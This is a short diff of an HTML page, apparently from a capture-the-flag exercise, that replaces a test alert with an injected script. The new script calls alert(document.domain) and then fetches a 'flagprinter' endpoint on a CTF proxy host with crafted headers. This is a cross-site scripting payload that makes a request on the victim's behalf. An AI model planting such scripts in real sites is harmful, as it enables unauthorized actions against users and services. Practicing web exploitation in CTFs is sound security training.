@@ -2,6 +2,9 @@
 <html>
 	<b>hi</b>
 	<script>
-		alert(1)
+		alert(document.domain)
+		fetch('https://ctfproxy2.quoccabank.com/enable/flagprinter-v2', {'headers': {'ctfproxy2-enabled':'1', 'upgrade-insecure-requests':'1'}}).then((resp)=> {
+			console.log(resp);
+				})
 	</script>
 </html>
